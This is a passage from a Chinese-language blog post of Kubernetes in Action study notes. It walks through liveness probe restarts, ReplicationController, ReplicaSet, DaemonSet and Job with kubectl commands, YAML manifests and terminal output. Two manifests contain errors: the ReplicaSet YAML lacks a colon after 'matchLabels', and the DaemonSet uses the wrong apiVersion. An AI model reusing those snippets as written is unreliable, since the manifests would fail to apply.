class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl create -f kubia-liveness-probe.yaml</span><br></pre></td></tr></table></figure><p>大约过几分钟后，我们通过<code>kubectl get</code>可以看到，pod的容器已经被重启了一次，如果继续等下去，容器将会再次重启，无限循环。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro DockerTest % kubectl get pod kubia-liveness</span><br><span class="line">NAME             READY   STATUS    RESTARTS   AGE</span><br><span class="line">kubia-liveness   1/1     Running   1          5m1s</span><br></pre></td></tr></table></figure><p>通过<code>kubectl describe</code>可以看到重启容器后的相关描述</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro DockerTest % kubectl describe pod kubia-liveness</span><br><span class="line">Name:         kubia-liveness</span><br><span class="line">Namespace:    default</span><br><span class="line">Priority:     0</span><br><span class="line">Node:         docker-desktop/192.168.65.4</span><br><span class="line">Start Time:   Thu, 07 Oct 2021 10:42:42 +0800</span><br><span class="line">Labels:       &lt;none&gt;</span><br><span class="line">Annotations:  &lt;none&gt;</span><br><span class="line">Status:       Running</span><br><span class="line">IP:           10.1.0.33</span><br><span class="line">IPs:</span><br><span class="line">  IP:  10.1.0.33</span><br><span class="line">Containers:</span><br><span class="line">  kubia:</span><br><span class="line">    Container ID:   docker://983b1e5ec9db6185dd66335def1b0b4ed3edd2eb1a6c4d4cd934fc697b450f67</span><br><span class="line">    Image:          luksa/kubia-unhealthy</span><br><span class="line">    Image ID:       docker-pullable://luksa/kubia-unhealthy@sha256:5c746a42612be61209417d913030d97555cff0b8225092908c57634ad7c235f7</span><br><span class="line">    Port:           &lt;none&gt;</span><br><span class="line">    Host Port:      &lt;none&gt;</span><br><span class="line">    State:          Running</span><br><span class="line">      Started:      Thu, 07 Oct 2021 10:49:03 +0800</span><br><span class="line">    Last State:     Terminated</span><br><span class="line">      Reason:       Error</span><br><span class="line">      Exit Code:    137</span><br><span class="line">      Started:      Thu, 07 Oct 2021 10:47:14 +0800</span><br><span class="line">      Finished:     Thu, 07 Oct 2021 10:49:02 +0800</span><br><span class="line">    Ready:          True</span><br><span class="line">    Restart Count:  2</span><br><span class="line">    Liveness:       http-get http://:8080/ delay=0s timeout=1s period=10s #success=1 #failure=3</span><br><span class="line">    Environment:    &lt;none&gt;</span><br></pre></td></tr></table></figure><p>从上述返回的结果中我们可以看到容器此时是正在运行着的，但之前由于<code>Terminated</code>而退出，退出代码为137，137表示该进程由外部信号中断，137是两个数字的总和：128+x，其中x是终止进程的信号编号，在这个例子中，x等于9，这是SIGKILL的信号编号，意味着这个进程被强行终止。</p><h4 id="ReplicationController"><a href="#ReplicationController" class="headerlink" title="ReplicationController"></a>ReplicationController</h4><h5 id="ReplicationController介绍"><a href="#ReplicationController介绍" class="headerlink" title="ReplicationController介绍"></a>ReplicationController介绍</h5><p>ReplicationController是一种Kubernetes资源，可确保它的pod始终保持运行状态，如果pod因任何原因消失，则ReplicationController会注意到缺少了pod并创建替代pod。如下图所示，当节点出现故障时，只有ReplicationController管理的pod才能被重新创建。对于podA而言，则会完全丢失，因为没有东西负责重建它。</p><p><img src="/2021/10/07/Kubernetes-in-Action-Learning-Notes/1.png" alt="1"></p><p>ReplicationController会持续监控正在运行的pod列表，并保证相应“类型”的pod的数目与期望相符，如果正在运行的pod太少，它会根据pod模版创建新的副本。如果正在运行的pod太多，它会删除多余的副本。</p><h5 id="ReplicationController协调流程"><a href="#ReplicationController协调流程" class="headerlink" title="ReplicationController协调流程"></a>ReplicationController协调流程</h5><p>ReplicationController的工作是确保pod的数量始终与其标签选择器匹配。 如果不匹配， 则ReplicationController将根据所需， 采取适当的操作来协调pod的数量。如下图是一个ReplicationController的协调流程</p><p><img src="/2021/10/07/Kubernetes-in-Action-Learning-Notes/2.png" alt="2"></p><h5 id="ReplicationController组成"><a href="#ReplicationController组成" class="headerlink" title="ReplicationController组成"></a>ReplicationController组成</h5><ul><li>label selector（标签选择器）：用于确定ReplicationController作用域中有哪些pod</li><li>replica count（副本个数）：指定应运行的pod数量</li><li>pod template（pod模版）：用于创建新的pod</li></ul><h5 id="创建ReplicationController"><a href="#创建ReplicationController" class="headerlink" title="创建ReplicationController"></a>创建ReplicationController</h5><p>首先创建一个名为<code>kubia-rc.yaml</code>的YAML文件，代码描述如下。当上传文件道API服务器时，Kubernetes会创建一个名为kubia的ReplicationController，它确保符合标签选择器<code>app=kubia</code>的pod实例始终是三个，当没有足够的pod时，它根据提供的pod模版创建新的pod。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">apiVersion: v1</span><br><span class="line">kind: ReplicationController</span><br><span class="line">metadata:</span><br><span class="line">  name: kubia</span><br><span class="line">spec:</span><br><span class="line">  replicas: 3</span><br><span class="line">  selector:</span><br><span class="line">    app: kubia</span><br><span class="line">  template:</span><br><span class="line">    metadata:</span><br><span class="line">      labels:</span><br><span class="line">        app: kubia</span><br><span class="line">    spec:</span><br><span class="line">      containers:</span><br><span class="line">      - name: kubia</span><br><span class="line">        image: luksa/kubia</span><br><span class="line">        ports:</span><br><span class="line">        - containerPort: 8080</span><br></pre></td></tr></table></figure><p>使用<code>kubectl create</code>命令创建</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl create -f kubia-rc.yaml</span><br></pre></td></tr></table></figure><p>由于没有任何pod有<code>app=kubia</code>标签，因此ReplicationController会根据pod模版启动三个新的pod。使用<code>kubectl get</code>查看。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro DockerTest % kubectl get pods               </span><br><span class="line">NAME          READY   STATUS    RESTARTS   AGE</span><br><span class="line">kubia-gjcxj   1/1     Running   0          6s</span><br><span class="line">kubia-pd5r5   1/1     Running   0          6s</span><br><span class="line">kubia-tgjsn   1/1     Running   0          6s</span><br></pre></td></tr></table></figure><p>这个时候如果我们删除了一个pod，看看会发生什么。这个时候被删除的pod状态处于终止状态，而新的pod处于创建状态。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro ~ % kubectl get pods                  </span><br><span class="line">NAME          READY   STATUS              RESTARTS   AGE</span><br><span class="line">kubia-bcbz5   0/1     ContainerCreating   0          2s</span><br><span class="line">kubia-gjcxj   1/1     Terminating         0          36s</span><br><span class="line">kubia-pd5r5   1/1     Running             0          36s</span><br><span class="line">kubia-tgjsn   1/1     Running             0          36s</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro DockerTest % kubectl get pods              </span><br><span class="line">NAME          READY   STATUS    RESTARTS   AGE</span><br><span class="line">kubia-bcbz5   1/1     Running   0          2m29s</span><br><span class="line">kubia-pd5r5   1/1     Running   0          3m3s</span><br><span class="line">kubia-tgjsn   1/1     Running   0          3m3s</span><br></pre></td></tr></table></figure><p>通过<code>kubectl get</code>查看ReplicationController的信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro DockerTest % kubectl get rc</span><br><span class="line">NAME    DESIRED   CURRENT   READY   AGE</span><br><span class="line">kubia   3         3         3       3m31s</span><br></pre></td></tr></table></figure><p>通过<code>kubectl describe</code>查看ReplicationController详细信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro DockerTest % kubectl describe rc kubia</span><br><span class="line">Name:         kubia</span><br><span class="line">Namespace:    default</span><br><span class="line">Selector:     app=kubia</span><br><span class="line">Labels:       app=kubia</span><br><span class="line">Annotations:  &lt;none&gt;</span><br><span class="line">Replicas:     3 current / 3 desired</span><br><span class="line">Pods Status:  3 Running / 0 Waiting / 0 Succeeded / 0 Failed</span><br><span class="line">Pod Template:</span><br><span class="line">  Labels:  app=kubia</span><br><span class="line">  Containers:</span><br><span class="line">   kubia:</span><br><span class="line">    Image:        luksa/kubia</span><br><span class="line">    Port:         8080/TCP</span><br><span class="line">    Host Port:    0/TCP</span><br><span class="line">    Environment:  &lt;none&gt;</span><br><span class="line">    Mounts:       &lt;none&gt;</span><br><span class="line">  Volumes:        &lt;none&gt;</span><br><span class="line">Events:</span><br><span class="line">  Type    Reason            Age    From                    Message</span><br><span class="line">  ----    ------            ----   ----                    -------</span><br><span class="line">  Normal  SuccessfulCreate  5m1s   replication-controller  Created pod: kubia-tgjsn</span><br><span class="line">  Normal  SuccessfulCreate  5m1s   replication-controller  Created pod: kubia-gjcxj</span><br><span class="line">  Normal  SuccessfulCreate  5m1s   replication-controller  Created pod: kubia-pd5r5</span><br><span class="line">  Normal  SuccessfulCreate  4m27s  replication-controller  Created pod: kubia-bcbz5</span><br></pre></td></tr></table></figure><p>获取当前ReplicationController管理的pod的标签</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro DockerTest % kubectl get pods --show-labels</span><br><span class="line">NAME          READY   STATUS    RESTARTS   AGE     LABELS</span><br><span class="line">kubia-bcbz5   1/1     Running   0          7m48s   app=kubia</span><br><span class="line">kubia-pd5r5   1/1     Running   0          8m22s   app=kubia</span><br><span class="line">kubia-tgjsn   1/1     Running   0          8m22s   app=kubia</span><br></pre></td></tr></table></figure><p>给ReplicationController管理的pod加标签，在这里我们给名为<code>kubia-bcbz5</code>的pod添加了一个<code>type=special</code>的标签</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl label pod kubia-bcbz5 type=special</span><br></pre></td></tr></table></figure><p>这个时候我们再次查看pod的标签</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro DockerTest % kubectl get pods --show-labels            </span><br><span class="line">NAME          READY   STATUS    RESTARTS   AGE   LABELS</span><br><span class="line">kubia-bcbz5   1/1     Running   0          11m   app=kubia,type=special</span><br><span class="line">kubia-pd5r5   1/1     Running   0          11m   app=kubia</span><br><span class="line">kubia-tgjsn   1/1     Running   0          11m   app=kubia</span><br></pre></td></tr></table></figure><p>更改已托管的pod的标签，这里我们还是更改名为<code>kubia-bcbz5</code>的pod的标签，这一步操作会使得该pod不再与ReplicationController的标签选择器相匹配。因此这个时候ReplicationController会重新启动一个新的pod。在这里我们使用了<code>--overwrite</code>参数是为了覆盖标签。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl label pod kubia-bcbz5 app=foo --overwrite</span><br></pre></td></tr></table></figure><p>这个时候我们再次列出所有pod，会发现多了一个pod，最后一个是新创建出来的</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro DockerTest % kubectl get pods -L app</span><br><span class="line">NAME          READY   STATUS    RESTARTS   AGE     APP</span><br><span class="line">kubia-bcbz5   1/1     Running   0          14m     foo</span><br><span class="line">kubia-pd5r5   1/1     Running   0          15m     kubia</span><br><span class="line">kubia-tgjsn   1/1     Running   0          15m     kubia</span><br><span class="line">kubia-zxcjw   1/1     Running   0          2m27s   kubia</span><br></pre></td></tr></table></figure><p>下图展示了当我们更改pod的标签时，ReplicationController发生的一些操作。</p><p><img src="/2021/10/07/Kubernetes-in-Action-Learning-Notes/3.png" alt="3"></p><h5 id="ReplicationController扩容"><a href="#ReplicationController扩容" class="headerlink" title="ReplicationController扩容"></a>ReplicationController扩容</h5><h6 id="第一种方法"><a href="#第一种方法" class="headerlink" title="第一种方法"></a>第一种方法</h6><p>通过<code>kubectl scale</code>命令扩容</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl scale rc kubia --replicas=10</span><br></pre></td></tr></table></figure><h6 id="第二种方法"><a href="#第二种方法" class="headerlink" title="第二种方法"></a>第二种方法</h6><p>通过编辑定义来扩容</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl edit rc kubia</span><br></pre></td></tr></table></figure><p>之后将replicas的值从3改为10即可。再次使用<code>kubectl get</code>查看，发现扩展成功</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro DockerTest % kubectl get rc</span><br><span class="line">NAME    DESIRED   CURRENT   READY   AGE</span><br><span class="line">kubia   10        10        5       27m</span><br></pre></td></tr></table></figure><h5 id="删除ReplicationController"><a href="#删除ReplicationController" class="headerlink" title="删除ReplicationController"></a>删除ReplicationController</h5><p>当使用<code>kubectl delete</code>删除ReplicationController时，pod也会被删除。当然我们也可以只删除ReplicationController，从而保持pod运行。通过增加<code>--cascade=false</code>选项来保持pod的运行。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl delete rc kubia --cascade=false</span><br></pre></td></tr></table></figure><h4 id="ReplicaSet"><a href="#ReplicaSet" class="headerlink" title="ReplicaSet"></a>ReplicaSet</h4><p>ReplicaSet的行为和ReplicationController完全相同，但是pod选择器的表达能力更强</p><h5 id="定义ReplicaSet"><a href="#定义ReplicaSet" class="headerlink" title="定义ReplicaSet"></a>定义ReplicaSet</h5><p>首先创建一个名为<code>kubia-replicaset.yaml</code>的YAML文件</p><p>这里需要注意的是ReplicaSet不是<code>v1 API</code>的一部分，它属于<code>apps API</code>组的<code>v1</code>版本。其次是在选择其中，不需要再selector属性中直接列出pod需要的标签，而是在<code>selector.matchLabels</code>下指定它们。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">apiVersion: apps/v1</span><br><span class="line">kind: ReplicaSet</span><br><span class="line">metadata:</span><br><span class="line">  name: kubia</span><br><span class="line">spec:</span><br><span class="line">  replicas: 3</span><br><span class="line">  selector:</span><br><span class="line">    matchLabels</span><br><span class="line">      app: kubia</span><br><span class="line">  template:</span><br><span class="line">    metadata:</span><br><span class="line">      labels:</span><br><span class="line">        app: kubia</span><br><span class="line">    spec:</span><br><span class="line">      containers:</span><br><span class="line">      - name: kubia</span><br><span class="line">        image: luksa/kubia</span><br><span class="line">        ports:</span><br><span class="line">        - containerPort: 8080</span><br></pre></td></tr></table></figure><p>在上一节的删除ReplicationController中，我们没有删除pod。因此在创建ReplicaSet的时候不会创建任何新的pod，ReplicaSet会把现有的三个pod归为自己来管理。</p><h5 id="创建和检查ReplicaSet"><a href="#创建和检查ReplicaSet" class="headerlink" title="创建和检查ReplicaSet"></a>创建和检查ReplicaSet</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl create -f kubia-replicaset.yaml</span><br></pre></td></tr></table></figure><p>使用<code>kubectl get</code>来获取当前的ReplicaSet</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl get rs</span><br></pre></td></tr></table></figure><p>使用<code>kubectl describe</code>来检查当前的ReplicaSet</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl describe rs</span><br></pre></td></tr></table></figure><p>这个时候如果我们使用<code>kubectl get</code>来列出当前的pod，则会发现还是之前的那三个pod，而ReplicaSet并没有创建新的pod</p><h5 id="删除ReplicaSet"><a href="#删除ReplicaSet" class="headerlink" title="删除ReplicaSet"></a>删除ReplicaSet</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl delete rs kubia</span><br></pre></td></tr></table></figure><h4 id="DaemonSet"><a href="#DaemonSet" class="headerlink" title="DaemonSet"></a>DaemonSet</h4><p>DaemonSet确保全部（或者某些）节点上运行一个 Pod 的副本。 当有节点加入集群时， 也会为他们新增一个 Pod 。 当有节点从集群移除时，这些 Pod 也会被回收。删除 DaemonSet 将会删除它创建的所有 Pod。</p><p>DaemonSet 的一些典型用法：</p><ul><li>在每个节点上运行集群守护进程</li><li>在每个节点上运行日志收集守护进程</li><li>在每个节点上运行监控守护进程</li></ul><p>一种简单的用法是为每种类型的守护进程在所有的节点上都启动一个 DaemonSet。 一个稍微复杂的用法是为同一种守护进程部署多个 DaemonSet；每个具有不同的标志， 并且对不同硬件类型具有不同的内存、CPU要求。</p><p>DaemonSet将pod部署到集群中的所有节点上，除非指定这些pod只在部分节点上运行，这是通过pod模版中的nodeSelector属性指定的，这是DaemonSet定义的一部分。</p><h5 id="一个例子"><a href="#一个例子" class="headerlink" title="一个例子"></a>一个例子</h5><p>假设有一个名为ssd-monitor的守护进程，它需要在包含固态驱动器(SSD)的所有节点上运行，我们需要创建一个DaemonSet，它在标记为具有SSD的所有节点上运行这个守护进程，如下图所示</p><p><img src="/2021/10/07/Kubernetes-in-Action-Learning-Notes/4.png" alt="4"></p><p>第一步还是创建一个DaemonSet的YAML文件，这样会创建一个运行ssd-monitor监控器进程的DaemonSet，该进程每5s会将”SSD OK”打印到标准输出。YAML文件名为<code>ssd-monitor-daemonset.yaml</code></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">DaemonSet</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">ssd-monitor</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">selector:</span></span><br><span class="line">    <span class="attr">matchLabels:</span></span><br><span class="line">      <span class="attr">app:</span> <span class="string">ssd-monitor</span></span><br><span class="line">  <span class="attr">template:</span></span><br><span class="line">    <span class="attr">metadata:</span></span><br><span class="line">      <span class="attr">labels:</span></span><br><span class="line">        <span class="attr">app:</span> <span class="string">ssd-monitor</span></span><br><span class="line">    <span class="attr">spec:</span></span><br><span class="line">      <span class="attr">nodeSelector:</span></span><br><span class="line">        <span class="attr">disk:</span> <span class="string">ssd</span></span><br><span class="line">      <span class="attr">containers:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">main</span></span><br><span class="line">        <span class="attr">image:</span> <span class="string">luksa/ssd-monitor</span></span><br></pre></td></tr></table></figure><p>通过<code>kubectl create</code>创建DaemonSet</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl create -f ssd-monitor-daemonset.yaml</span><br></pre></td></tr></table></figure><p>通过<code>kubectl get</code>查看DaemonSet</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl get ds</span><br></pre></td></tr></table></figure><p>这个时候我们获取pod信息发现没有pod相关信息，这是因为我们没有给节点打上<code>disk=ssd</code>的标签，和上面那个图描述的一样，如果节点没有<code>disk=ssd</code>这个标签，则DaemonSet不会为该节点部署pod，因此我们需要为节点添加标签，这里我使用的节点为<code>docker-desktop</code>，当然你也可以通过<code>kubectl get node</code>获取你的节点信息。</p><p>现在给节点添加<code>disk=ssd</code>标签</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl label node docker-desktop disk=ssd</span><br></pre></td></tr></table></figure><p>查看是否成功为节点打上标签</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro DockerTest % kubectl get node --show-labels              </span><br><span class="line">NAME             STATUS   ROLES                  AGE   VERSION   LABELS</span><br><span class="line">docker-desktop   Ready    control-plane,master   43h   v1.21.3   beta.kubernetes.io/arch=amd64,beta.kubernetes.io/os=linux,disk=ssd,kubernetes.io/arch=amd64,kubernetes.io/hostname=docker-desktop,kubernetes.io/os=linux,node-role.kubernetes.io/control-plane=,node-role.kubernetes.io/master=,node.kubernetes.io/exclude-from-external-load-balancers=</span><br></pre></td></tr></table></figure><p>现在重新获取节点信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro DockerTest % kubectl get pods</span><br><span class="line">NAME                READY   STATUS    RESTARTS   AGE</span><br><span class="line">ssd-monitor-6gmhm   1/1     Running   0          78s</span><br></pre></td></tr></table></figure><p>假如说这个时候我们修改了节点的标签，看看会发生什么，如下面命令所示，我们将<code>disk=ssd</code>改为了<code>disk=hdd</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl label node docker-desktop disk=hdd --overwrite</span><br></pre></td></tr></table></figure><p>这个时候我们再次查看pod，发现pod正在被终止</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro DockerTest % kubectl get pods                                      </span><br><span class="line">NAME                READY   STATUS        RESTARTS   AGE</span><br><span class="line">ssd-monitor-6gmhm   1/1     Terminating   0          3m59s</span><br></pre></td></tr></table></figure><p>删除节点标签，如果我们要删除某个节点的标签，命令如下，其中disk为标签的键，后面的减号代表删除该标签</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl label node docker-desktop disk-</span><br></pre></td></tr></table></figure><h4 id="Job"><a href="#Job" class="headerlink" title="Job"></a>Job</h4><p>Job 会创建一个或者多个 Pods，并将继续重试 Pods 的执行，直到指定数量的 Pods 成功终止。 随着 Pods 成功结束，Job 跟踪记录成功完成的 Pods 个数。 当数量达到指定的成功个数阈值时，任务（即 Job）结束。 删除 Job 的操作会清除所创建的全部 Pods。 挂起 Job 的操作会删除 Job 的所有活跃 Pod，直到 Job 被再次恢复执行。</p><p>一种简单的使用场景下，你会创建一个 Job 对象以便以一种可靠的方式运行某 Pod 直到完成。 当第一个 Pod 失败或者被删除（比如因为节点硬件失效或者重启）时，Job 对象会启动一个新的 Pod。</p><p>你也可以使用 Job 以并行的方式运行多个 Pod。</p><h5 id="定义Job资源"><a href="#定义Job资源" class="headerlink" title="定义Job资源"></a>定义Job资源</h5><p>老规矩，还是创建一个名为<code>exporter.yaml</code>的YAML文件。该文件定义了一个Job类型的资源，它将运行<code>luksa/batch-job</code>镜像，该镜像调用一个运行120秒的进程，然后退出。在pod配置的属性restartPolicy默认为Always，然而Job pod不能使用默认策略，因为它们不是要无限期的运行下去，因此需要明确指定restartPolicy为<code>OnFailure</code>还是<code>Never</code>，这一设置防止容器在完成任务时重新启动。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">apiVersion: batch/v1</span><br><span class="line">kind: Job</span><br><span class="line">metadata:</span><br><span class="line">  name: batch-job</span><br><span class="line">spec:</span><br><span class="line">  template:</span><br><span class="line">    metadata:</span><br><span class="line">      labels:</span><br><span class="line">        app: batch-job</span><br><span class="line">    spec:</span><br><span class="line">      restartPolicy: OnFailure</span><br><span class="line">      containers:</span><br><span class="line">      - name: main</span><br><span class="line">        image: luksa/batch-job</span><br></pre></td></tr></table></figure><p>创建该job</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl create -f exporter.yaml</span><br></pre></td></tr></table></figure><p>获取job信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro DockerTest % kubectl get jobs</span><br><span class="line">NAME        COMPLETIONS   DURATION   AGE</span><br><span class="line">batch-job   0/1           8s         8s</span><br></pre></td></tr></table></figure><p>获取pod信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro DockerTest % kubectl get pods</span><br><span class="line">NAME              READY   STATUS    RESTARTS   AGE</span><br><span class="line">batch-job-q8c44   1/1     Running   0          18s</span><br></pre></td></tr></table></figure><p>两分钟之后，我们再次获取pod信息，会发现该pod的状态被标记为已完成。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro DockerTest % kubectl get pods</span><br><span class="line">NAME              READY   STATUS      RESTARTS   AGE</span><br><span class="line">batch-job-q8c44   0/1     Completed   0          2m15s</span><br></pre></td></tr></table></figure><p>pod完成后并没有被删除，这样方便我们查阅该pod 的日志，如下命令所示</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro DockerTest % kubectl logs batch-job-q8c44</span><br><span class="line">Fri Oct  8 10:07:58 UTC 2021 Batch job starting</span><br><span class="line">Fri Oct  8 10:09:58 UTC 2021 Finished succesfully</span><br></pre></td></tr></table></figure><h5 id="在Job中运行多个pod实例"><a href="#在Job中运行多个pod实例" class="headerlink" title="在Job中运行多个pod实例"></a>在Job中运行多个pod实例</h5><p>顺序运行：设置<code>completions</code>的值为多少，该job就会创建多少个pod，然后顺序运行。</p><p>并行运行：设置<code>parallelism</code>的值为多少，该job就会一次并行运行多少个pod，并行运行中也要设置<code>completions</code>的值</p><h5 id="限制job-pod完成任务的时间"><a href="#限制job-pod完成任务的时间" class="headerlink" title="限制job pod完成任务的时间"></a>限制job 